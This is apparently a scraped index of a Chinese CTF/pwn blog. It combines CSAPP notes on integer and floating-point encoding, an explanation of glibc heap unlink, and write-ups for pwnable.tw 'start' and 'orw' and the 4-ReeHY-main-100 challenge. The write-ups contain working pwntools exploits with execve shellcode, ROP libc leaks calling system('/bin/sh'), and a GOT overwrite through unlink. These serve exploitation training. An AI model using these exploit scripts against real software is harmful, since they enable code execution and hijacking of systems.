","date":"2021-01-20","objectID":"/csapp-lecture-01/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#bool代数"},{"categories":["Pwning"],"content":"移位运算：$x«k$，$x$向左移动$k$位，丢弃最高的$k$位，并在右端补$k$个0。 算术右移：$x»k$，$x$向右移动$k$位，丢弃最低的$k$位，并在左端补$k$个最高有效位。 逻辑右移：$x»k$，$x$向右移动$k$位，丢弃最低的$k$位，并在左端补$k$个0。 x [01100011] [10010101] x«4 [00110000] [01010000] x»4(逻辑右移) [00000110] [00001001] x»4(算术右移) [00000110] [11110001] ","date":"2021-01-20","objectID":"/csapp-lecture-01/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#移位运算"},{"categories":["Pwning"],"content":"无符号数的编码$B2U_w(x)$=$$\\sum_{i=0}^{w-1}{x_i2^i}$$，$w$表示数$x$的位数 $B2U_4([1010])=12^3+02^2+12^1+02^0$=10 无符号数编码的唯一性，函数$B2U_w$是一个双射。 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#无符号数的编码"},{"categories":["Pwning"],"content":"补码编码$B2T_w(x)=-x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2}{x_i2^i}$，$w$表示数$x$的位数 $B2T_4(1011)=-12^3+02^2+12^1+12^0=-8+0+2+1=-5$ 补码编码的唯一性，函数$B2T_w(x)$是一个双射。 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#补码编码"},{"categories":["Pwning"],"content":"有符号与无符号数的转换$$T2U_w(x)=\\begin{cases} x+2^w,x\u003c0\\x,x≥0\\end{cases}$$ $$U2T_w(u)=\\begin{cases} u,u≤TMax_w\\u-2^w,u＞TMax_w\\end{cases}$$ 强制类型转换，只是改变了位的解释方式，不改变位值。 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:6:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#有符号与无符号数的转换"},{"categories":["Pwning"],"content":"扩展一个数字的位表达","date":"2021-01-20","objectID":"/csapp-lecture-01/:7:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#扩展一个数字的位表达"},{"categories":["Pwning"],"content":"无符号数的零拓展宽度为$w$的位向量$u=[u_{w-1},u_{w-2},···，u_0]$， 宽度为$w^的位向量u^=[0,0,u_{w-1},u_{w-2},···,u_0]，$其中$w^`＞w$. ","date":"2021-01-20","objectID":"/csapp-lecture-01/:7:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#无符号数的零拓展"},{"categories":["Pwning"],"content":"补码数的符号拓展宽度为$w$的位向量$u=[u_{w-1},u_{w-2},···，u_0]$， 宽度为$w^的位向量u^=[u_{w-1},u_{w-1},u_{w-1},u_{w-2},···,u_0]$，其中$w^`＞w$. ","date":"2021-01-20","objectID":"/csapp-lecture-01/:7:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#补码数的符号拓展"},{"categories":["Pwning"],"content":"截断将数从高位向低位强制转换时，会发生截断，截断$k$位，即丢弃其高$k$位。即，虽然原地址储存的数据没有变化，但是其高k位已经没有了意义。 例如，int转short。 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:8:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#截断"},{"categories":["Pwning"],"content":"整数运算","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#整数运算"},{"categories":["Pwning"],"content":"无符号数加法$$x+y^u_w=\\begin{cases} x+y,x+y＜2^w\\x+y-2^w,2^w≤x+y\u003c2^{w+1}\\end{cases}$$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#无符号数加法"},{"categories":["Pwning"],"content":"无符号求反$$-x^u_w=\\begin{cases}x,x=0\\2^w-x,x\u003e0\\end{cases}$$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#无符号求反"},{"categories":["Pwning"],"content":"补码加法$$ x+y^t_w=\\begin{cases} x+y-2^w,2^{w-1}≤x+y\\x+y,-2^{w-1}≤x+y\u003c2^{w-1}\\x+y+2^w,x+y\u003c-2^{w-1}\\end{cases} $$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#补码加法"},{"categories":["Pwning"],"content":"补码的非$$ -x^t_w=\\begin{cases}TMin_w,x=TMin_w\\-x,x\u003eTMin_w\\end{cases} $$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#补码的非"},{"categories":["Pwning"],"content":"无符号的乘法$$ x*y^u_w=(x·y)mod 2^w $$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:5","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#无符号的乘法"},{"categories":["Pwning"],"content":"补码的乘法$$x*y^t_w=U2T_w((x·y)mod 2^w)$$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:6","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#补码的乘法"},{"categories":["Pwning"],"content":"与常数的运算对于任意常数的运算在后面会讲，类似进行$(a«k)+b$,例如$(a«1)+a=3*a$ 现在主要考虑与2的幂的运算： 乘法： 实际就是对其二进制表示进行左移操作，对于固定字长的数需要舍弃超出的位数。 除法： 实际是进行右移操作，对于无符号数进行逻辑右移，而对于补码，为了保持其符号的一致，进行的是算术右移。 这也解释了为什么右移有两种，而左移只有一种。 对于补码除法还有一个舍入问题，看下面的例子： 执行表达式$x»k$ k \u003e\u003ek 十进制 $-12340/2^k$ 0 1100111111001100 -12340 -12340.0 1 1110011111100110 -6170 -6170.0 4 1111110011111100 -772 -771.25 8 1111111111001111 -49 -48.203125 可以发现进行算术右移后，结果进行了向下舍入，而不是向零舍入。这使我们的数产生了很大的偏差，所以我们使用“偏置（biasing）”来进行修正： 执行表达式$(x+(1«k)-1)»k$ k biasing -12340+biasing \u003e\u003ek 十进制 $-12340/2^k$ 0 0 1100111111001100 1100111111001100 -12340 -12340.0 1 1 1100111111001101 1110011111100110 -6170 -6170.0 4 15 1100111111011011 1111110011111101 -771 -771.25 8 255 1101000011001011 1111111111010000 -48 -48.203125 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:7","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#与常数的运算"},{"categories":["Pwning"],"content":"Lecture 02: Floating point","date":"2021-01-20","objectID":"/csapp-lecture-02/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#lecture-02-floating-point"},{"categories":["Pwning"],"content":"浮点数","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#浮点数"},{"categories":["Pwning"],"content":"二进制小数与整数一样，个位代表$2^0$,那么小数点后的k位数就是$2^{-k}$。 对于$0.111…111_2$这样刚好小于1的数，使用简单的$1.0-\\varepsilon$。 但是对于$\\frac{1}{3}$这样的数就不能表示，只能近似。 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#二进制小数"},{"categories":["Pwning"],"content":"IEEE浮点表示IEEE浮点标准用$V=(-1)^s×M×2^E$的形式表示一个数： 符号（sign） s决定这数是负数（s=1）还是正数（s=0）。 尾数（significand） M是一个二进制小数，它的范围是1~2-$\\varepsilon$,或0~1-$\\varepsilon$ 阶码（exponent） E的作用是对浮点数加权，这个权重是2的E次幂（可能是负数） 将浮点数的位表示划分为三个字段： 一个单独的符号位s k位的阶码字段$exp=e_{k-1}e_{k-2}…e_0$编码阶码E n位小数字段$frac=f_{n-1}f_{n-2}…f_0$,编码尾数M，其真实值与E的编码有关 对于这些字段的位置有精度的划分： c语言float中，s、exp和frac字段分别为1位、k=8位和23位，共32位。 c语言double中，s、exp和frac字段分别为1位、k=11位和52位，共64位。 单精度的格式也分为几种情况： 规格化的 s（31） exp（30：23） frac（22：0） 0或1 ≠0\u0026≠255 ~ 这种情况阶码的值是E=e-Bias，其中e是无符号数，其位表示为$e_{k-1}e_{k-2}…e_0$，而Bias是一个等于$2^{k-1}-1$的偏置值。 f的位表示为$0.f_{n-1}f_{n-2}…f_0$，尾数的定义为M=1+f。即在规格化的格式中无法表示0这个数，那么既然不能表示，1也没有必要写在开头变成$1.f_{n-1}f_{n-2}…f_0$，这种就是隐含的以1开头。 非规格化的 s（31） exp（30：23） frac（22：0） 0或1 全为0 ~ 这种情况阶码的值是E=1-Bias，尾数的定义为M=f。这样我们就可以表示0，和非常接近0的数。 特殊的 无穷大： s（31） exp（30：23） frac（22：0） 0或1 全为1 全为0 NaN（not a number） s（31） exp（30：23） frac（22：0） 0或1 全为1 ≠0 下面用一个例子来做演示： 6.91，其二进制表示为$110.111010001111010111000_2$ 将其规格化，$6.91=(-1)^0×1.10111010001111010111000_2×2^2$ 这样三个字段的值就得到了： s=0 exp=E+Bias=$2+(2^{8-1}-1)$=129(十进制)=$1000 0001_2$ frac=10111010001111010111000 s（31） exp（30：23） frac（22：0） 0 10000001 10111010001111010111000 0100 0000 1101 1101 0001 1110 1011 1000 4 0 D D 1 E B 8 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#ieee浮点表示"},{"categories":["Pwning"],"content":"舍入 methods 1.40 1.60 1.50 2.50 -1.50 向偶数舍入 1 2 2 2 -2 向零舍入 1 1 1 2 -1 向下舍入 1 1 1 2 -2 向上舍入 2 2 2 3 -1 一般采用向偶数舍入，因为在大多数情况下它总是有效的。对于二进制小数，将最低有效位的值0认为是偶数，值1认为是奇数。一般在$0.xxxxx…x100$的情况下这种规则才适用，100为要舍弃的位。 Value Binary Rounded Action Rounded Value 2 3/32 10.00011 10.00 （\u003c1/2–down） 2 2 3/16 10.00110 10.01 (\u003e1/2–up) 2 1/4 2 7/8 10.11100 11.00 (1/2–up) 3 2 5/8 10.10100 10.10 (1/2–down) 2 1/2 对于上面的例子书上解释为：①与②不可能为两个可能值的中间值，而③和④可能，且我们倾向于使最低有效位为零。 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#舍入"},{"categories":["Pwning"],"content":"浮点数乘法浮点数运算无法直接通过在位向量上运算得到。 对于两个浮点数$(-1)^{s_1}×M_1×2^{E_1}$和$(-1)^{s_2}×M_2×2^{E_2}$，计算结果为$(-1)^{s}×M×2^{E}$，其中$s=s_1XORS_2$，$M=M_1×M_2$，$E=E_1+E_2$。 如果 [公式] ，就将frac右移一位，并对E加一。 如果E超过了表示范围，就发生了溢出。 如果M超过了表示范围，对frac进行舍入。 数学性质： 可交换 不可结合：可能出现溢出和不精确的舍入，比如$1e20*(1e201e-20)-1e20$，而$(1e201e20)*1e-20=INF$ 。 不可分配：如果分配了可能会出现NaN，比如$1e20*(1e20-1e20)=0$，而$1e201e20-1e201e20=NaN$ 。 保证，只要$a≠NaN$，则$a*^ta≥0$。 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#浮点数乘法"},{"categories":["Pwning"],"content":"浮点数加法对于两个浮点数$(-1)^{s_1}×M_1×2^{E_1}$和$(-1)^{s_2}×M_2×2^{E_2}$，计算结果为$(-1)^{s}×M×2^{E}$，其中s，M是对其后的运算结果，$E=max(E_1,E_2)$。 如果$M≥2$，则frac右移一位，并对E加1。 如果$M\u003c1$ ，则frac左移一位，并对E减1。 如果E超过表示范围，就发生溢出。 如果M超过表示范围，就对frac进行舍入。 数学性质： 由于溢出，可能得到无穷。 可交换 不可结合（由于舍入），因为较大的数和较小的数相加，由于舍入问题，会将较小的数舍入，比如$(3.14+1e20)-1e20=0$而$3.14+(1e20-1e20)=3.14$ 。 除了无穷和NaN，存在加法逆元。 满足单调性，如果$a≥b$，则对于任意a、b和x，都有$x+a≥x+b$。NaN除外。无符号数和补码由于溢出会发生值的跳变，所以不满足单调性。 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:5","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#浮点数加法"},{"categories":["Pwning"],"content":"homework x==(int)(float)x：int有32位，float尾数有23位，从int强制类型转换到float会出现舍入，所以错误。 x==(int)(double)x：int有32位，double尾数有52位，所以从int强制类型转换到float不会出现舍入，所以正确。 f==(float)(double)f：double的精度和范围都比float大，所以能够无损地从float强制类型转换到double，所以正确。 d==(double)(float)d：因为float的精度和范围都比double小，可能会出现溢出和输入，所以错误。 f==-(-f)：因为只要改变一个符号位，所以正确。 2/3==2/3.0： 因为2/3是int类型，会舍入变成0，而2/3.0是double类型，会得到数值，所以错误。 d\u003c0.0推出((d*2)\u003c0.0)：乘2相当于exp加一，如果出现溢出，也是无穷小，所以正确。 d\u003ef推出-f\u003e-d： 只要改变一个符号位，所以正确。 d*d\u003e=0.0： 正确。 (d+f)-d==f：不符合结合律，可能会出现舍入和溢出。 ","date":"2021-01-20","objectID":"/csapp-lecture-02/:1:6","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 02","uri":"/csapp-lecture-02/#homework"},{"categories":["Writeups"],"content":"Challenges_100-Week_3 Challenges Tricks pwnable.top-start shellcode pwnable.top-orw shellcode ","date":"2021-01-18","objectID":"/challenges-100-week-3/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#challenges_100-week_3"},{"categories":["Writeups"],"content":"start","date":"2021-01-18","objectID":"/challenges-100-week-3/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#start"},{"categories":["Writeups"],"content":"ida push esp push offset _exit xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx push 3A465443h push 20656874h push 20747261h push 74732073h push 2774654Ch mov ecx, esp ; addr mov dl, 14h ; len mov bl, 1 ; fd mov al, 4 int 80h ; LINUX - sys_write xor ebx, ebx mov dl, 3Ch ; '\u003c' mov al, 3 int 80h ; LINUX - sys_read add esp, 14h retn pop esp xor eax, eax inc eax int 80h ; LINUX - sys_exit 调试： pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x8049000 r-xp 1000 0 /home/niebelungen/Desktop/pwnable.tw/start/start 0xf7ff8000 0xf7ffc000 r--p 4000 0 [vvar] 0xf7ffc000 0xf7ffe000 r-xp 2000 0 [vdso] 0xfffdd000 0xffffe000 rwxp 21000 0 [stack] 没有足够的gadget让我们利用，正好stack有rwx权限，所以我们想办法在栈上写shellcode，再ret到那里。 首先我们要想办法leak栈的地址。 在add esp,14h后，esp指向了返回地址，下一条指令就是pop esp,而栈上保存的就是栈的地址。通过ret到mov ecx,esp调用sys_write可以leak栈地址。由此，再加上一个offset就可以到shellcode。 注意要写入的shellcode必须要短，0x3c-0x14-0x4=0x24。 ","date":"2021-01-18","objectID":"/challenges-100-week-3/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./start' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10000) elf = ELF(binary,checksec=False) #gdb.attach(p) shellcode='\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68' shellcode+='\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80'#0x17 payload='a'*0x14+p32(0x8048087) p.send(payload) p.recvuntil(\"Let's start the CTF:\") stack=u32(p.recv(4)) print hex(stack) payload='a'*0x14+p32(stack+20)+shellcode p.send(payload) p.interactive() pwnable.tw真的不错。这个题考察了汇编基础、shellcode的编写。这里记录一个shellcode的网站：shellcode ","date":"2021-01-18","objectID":"/challenges-100-week-3/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#exp"},{"categories":["Writeups"],"content":"orw","date":"2021-01-18","objectID":"/challenges-100-week-3/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#orw"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(\"Give my your shellcode:\"); read(0, \u0026shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } unsigned int orw_seccomp() { __int16 v1; // [esp+4h] [ebp-84h] BYREF char *v2; // [esp+8h] [ebp-80h] char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF unsigned int v4; // [esp+6Ch] [ebp-1Ch] v4 = __readgsdword(0x14u); qmemcpy(v3, \u0026unk_8048640, sizeof(v3)); v1 = 12; v2 = v3; prctl(38, 1, 0, 0, 0); prctl(22, 2, \u0026v1); return __readgsdword(0x14u) ^ v4; } 这个题使用了沙箱seccomp用来限制系统调用。你只能使用open, read, write的系统调用。但是沙箱其实还有更复杂的机制，由于与本题的重点关系不大所以不再赘述。由于限制，我们的shellcode只能使用上述的三个函数。 ","date":"2021-01-18","objectID":"/challenges-100-week-3/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * #from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./orw' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10001) elf = ELF(binary,checksec=False) #gdb.attach(p) file_name = \"/home/orw/flag\" shellcode = shellcraft.open(file_name) shellcode += shellcraft.read('eax','esp', 100) shellcode += shellcraft.write(1, 'esp', 100) shellcode = asm(shellcode) p.sendline(shellcode) p.interactive() 我这里取巧了，其实它的目的是让你手写汇编代码。 ","date":"2021-01-18","objectID":"/challenges-100-week-3/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 3","uri":"/challenges-100-week-3/#exp-1"},{"categories":["Pwning"],"content":"unlink /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\"); FD = P-\u003efd; BK = P-\u003ebk; if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else { FD-\u003ebk = BK; BK-\u003efd = FD; if (!in_smallbin_range (chunksize_nomask (P)) \u0026\u0026 __builtin_expect (P-\u003efd_nextsize != NULL, 0)) { if (__builtin_expect (P-\u003efd_nextsize-\u003ebk_nextsize != P, 0) || __builtin_expect (P-\u003ebk_nextsize-\u003efd_nextsize != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list (not small)\", P, AV); if (FD-\u003efd_nextsize == NULL) { if (P-\u003efd_nextsize == P) FD-\u003efd_nextsize = FD-\u003ebk_nextsize = FD; else { FD-\u003efd_nextsize = P-\u003efd_nextsize; FD-\u003ebk_nextsize = P-\u003ebk_nextsize; P-\u003efd_nextsize-\u003ebk_nextsize = FD; P-\u003ebk_nextsize-\u003efd_nextsize = FD; } } else { P-\u003efd_nextsize-\u003ebk_nextsize = P-\u003ebk_nextsize; P-\u003ebk_nextsize-\u003efd_nextsize = P-\u003efd_nextsize; } } } } unlink适用于small bin，且在最新的libc2.27及以上中，加入了新的机制，该攻击不再那么适用。但是对于该技巧的学习，有助于更好的理解堆操作。 ","date":"2021-01-17","objectID":"/heap-unlink/:0:0","series":null,"tags":["Pwn"],"title":"Heap Unlink","uri":"/heap-unlink/#unlink"},{"categories":["Pwning"],"content":"旧的unlink在旧的unlink中，并没有size和双向链表的检查。那么unlink操作就相当于执行了以下操作： FD = P -\u003e fd; BK = P -\u003e bk; FD -\u003e bk = BK; BK -\u003e fd = FD; 假设我们在P -\u003e fd中写入目标地址：dest_addr - 0x18，在P -\u003e bk中写入修改的地址（例如某函数的got表地址）expect_addr。以上函数相当于： FD = dest_addr - 0x18; BK = expect_addr; *(dest_addr - 0x18 + 0x18) = expect_addr *(expect_addr + 0x10) = dest_addr - 0x18 我们将expect_addr写入了dest_addr的位置。通过这一点我们可以向任意的位置写任意的值。 ","date":"2021-01-17","objectID":"/heap-unlink/:1:0","series":null,"tags":["Pwn"],"title":"Heap Unlink","uri":"/heap-unlink/#旧的unlink"},{"categories":["Pwning"],"content":"新的unlink添加了以下检查机制： ··· if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\"); FD = P-\u003efd; BK = P-\u003ebk; if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else { FD-\u003ebk = BK; BK-\u003efd = FD; ··· 它要求FD-\u003ebk = BK-\u003efd = P，即*(P -\u003e fd+0x18)==*(P -\u003e bk+0x10)==P，所以*(P -\u003e fd)=P-0x18，*(P -\u003e bk)=P-0x10。 最终实现： *P=P-0x18 此时，再编辑P所指chunk为某got表，就可以对got进行编辑。 应用的场景，存在一个管理堆指针的数组，这个数组我们无法直接操作，但是其P的附近，所以我们可以通过unlink改变其中的值，再将P指向我们想写入的地址（got表），实现任意地址写。 另外，因为我们要修改chunk header,所以需要想办法溢出或UAF。 ","date":"2021-01-17","objectID":"/heap-unlink/:2:0","series":null,"tags":["Pwn"],"title":"Heap Unlink","uri":"/heap-unlink/#新的unlink"},{"categories":["Writeups"],"content":"Challenges_100-Week_2 Challenges Tricks 攻防世界-4-ReeHY-main-100 ROP/unlink+double free ","date":"2021-01-16","objectID":"/challenges-100-week-2/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#challenges_100-week_2"},{"categories":["Writeups"],"content":"4-ReeHY-main-100","date":"2021-01-16","objectID":"/challenges-100-week-2/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#4-reehy-main-100"},{"categories":["Writeups"],"content":"checksec [*] '/home/niebelungen/Desktop/pwn/4-ReeHY-main-100/pwn' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-01-16","objectID":"/challenges-100-week-2/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#checksec"},{"categories":["Writeups"],"content":"IDA int __fastcall create(__int64 a1, __int64 a2) { int result; // eax char buf[128]; // [rsp+0h] [rbp-90h] BYREF void *dest; // [rsp+80h] [rbp-10h] int v5; // [rsp+88h] [rbp-8h] size_t nbytes; // [rsp+8Ch] [rbp-4h] result = chunk_num; if ( chunk_num \u003c= 4 ) { puts(\"Input size\"); result = ((__int64 (__fastcall *)(const char *, __int64))choice)(\"Input size\", a2); LODWORD(nbytes) = result; if ( result \u003c= 0x1000 ) { puts(\"Input cun\"); result = ((__int64 (__fastcall *)(const char *, __int64))choice)(\"Input cun\", a2); v5 = result; if ( result \u003c= 4 ) { dest = malloc((int)nbytes); puts(\"Input content\"); if ( (int)nbytes \u003e 112 ) { read(0, dest, (unsigned int)nbytes); } else { read(0, buf, (unsigned int)nbytes); memcpy(dest, buf, (int)nbytes); } *(_DWORD *)(size_t + 4LL * v5) = nbytes; *((_QWORD *)\u0026position + 2 * v5) = dest; signal[4 * v5] = 1; ++chunk_num; result = fflush(stdout); } } } return result; } __int64 dele() { __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] puts(\"Chose one to dele\"); result = choice(); v1 = result; if ( (int)result \u003c= 4 ) { free(*((void **)\u0026position + 2 * (int)result)); signal[4 * v1] = 0; puts(\"dele success!\"); result = (unsigned int)--chunk_num; } return result; } ","date":"2021-01-16","objectID":"/challenges-100-week-2/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#ida"},{"categories":["Writeups"],"content":"ROP首先看使用常规ROP，在create处，if条件和read得nbytes产生明显的溢出。 ","date":"2021-01-16","objectID":"/challenges-100-week-2/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#rop"},{"categories":["Writeups"],"content":"exp-ROP from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./pwn' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',34354) elf = ELF(binary,checksec=False) #libc=ELF('./ctflibc.so.6') pop_rdi=0x400da3 main_addr=0x400c8c p.sendlineafter('$ ','1234') p.sendlineafter('$ ','1') p.sendlineafter('Input size\\n','-1') p.sendlineafter('Input cun\\n','1') payload='a'*0x88+'\\x00'*0x8+'a'*0x8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main_addr) p.sendlineafter('Input content',payload) p.recv() puts_addr=u64(p.recv()[:6].ljust(8,'\\x00')) log.success('puts_addr:'+hex(puts_addr)) libc=LibcSearcher('puts',puts_addr) libc_base=puts_addr-libc.dump('puts') system=libc_base+libc.dump('system') bin_sh=libc_base+libc.dump('str_bin_sh') log.success('libc_base:'+hex(libc_base)) p.sendline('Niebelungen') p.sendlineafter('$ ','1') p.sendlineafter('Input size\\n','-1') p.sendlineafter('Input cun\\n','1') payload='a'*0x88+'\\x00'*0x8+'a'*0x8+p64(pop_rdi)+p64(bin_sh)+p64(system) p.sendlineafter('Input content',payload) p.interactive() ","date":"2021-01-16","objectID":"/challenges-100-week-2/:4:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#exp-rop"},{"categories":["Writeups"],"content":"unlink0x6020E0处储存着申请的堆的指针和状态信息，经过调试，我们可以申请到这个数组附近的chunk，所以我们通过unlink来修改这个数组的信息，使某一指针指向got表，从而对got表进行修改。 首先申请一个chunk，用来写‘/bin/sh’。然后申请三个size\u003efastbin的chunk1，chunk2，chunk3，将chunk2和chunk3都free掉。之后申请一个size等于chunk2+chunk3。这样我们实际获得了chunk3头部的控制权。在chunk2的数据域中构造fake_chunk，修改chunk3的头部进行unlink。 unlink后： ==\u003e |0 | \u003c== ptr - 0x18 | | | | |ptr - 0x18 | \u003c== ptr 这时修改*ptr为free@got |padding | |padding | |padding | |free@got| \u003c== ptr 此时ptr指向free@got，向ptr中写数据就是修改free@got ","date":"2021-01-16","objectID":"/challenges-100-week-2/:5:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#unlink"},{"categories":["Writeups"],"content":"exp-unlink from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./pwn' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',31890) elf = ELF(binary,checksec=False) atoi_got=elf.got['atoi'] puts_plt = elf.plt['puts'] free_got = elf.got['free'] puts_got = elf.got['puts'] heap = 0x602100 def create(size,index,content): p.sendlineafter('$ ','1') p.sendlineafter('Input size\\n',str(size)) p.sendlineafter('Input cun\\n',str(index)) p.sendafter('Input content\\n',content) def delete(index): p.sendlineafter('$ ','2') p.sendlineafter('Chose one to dele\\n',str(index)) def edit(index,content): p.sendlineafter('$ ','3') p.sendlineafter('Chose one to edit\\n',str(index)) p.sendafter('Input the content\\n',content) p.sendlineafter('$ ','Niebelungen') create(0x200,0,'/bin/sh\\x00') create(0x200,1,'first') create(0x200,2,'second') create(0x200,3,'third') #gdb.attach(p) delete(3) delete(2) payload=p64(0)+p64(0x201)+p64(heap-0x18)+p64(heap-0x10)+'a'*(0x200-0x20)+p64(0x200)+p64(0x200) create(0x400,2,payload) #unlink delete(3) payload=0x18*'1'+p64(free_got)+p64(1)+p64(atoi_got) edit(2,payload) edit(2,p64(puts_plt)) delete(3) atoi_addr=u64(p.recvn(6).ljust(8,'\\x00')) libc=LibcSearcher('atoi',atoi_addr) offset=atoi_addr-libc.dump('atoi') system_addr=offset+libc.dump('system') edit(2,p64(system_addr)) delete(0) p.interactive() ","date":"2021-01-16","objectID":"/challenges-100-week-2/:6:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 2","uri":"/challenges-100-week-2/#exp-unlink"},{"categories":["Writeups"],"content":"Challenges_100-Week_1 Challenges Tricks [攻防世界-Recho](# recho) Hack got+ROP+experience [攻防世界-supermarket](# supermarket) UAF+Hack got [攻防世界-hacknote](# hacknote) UAF 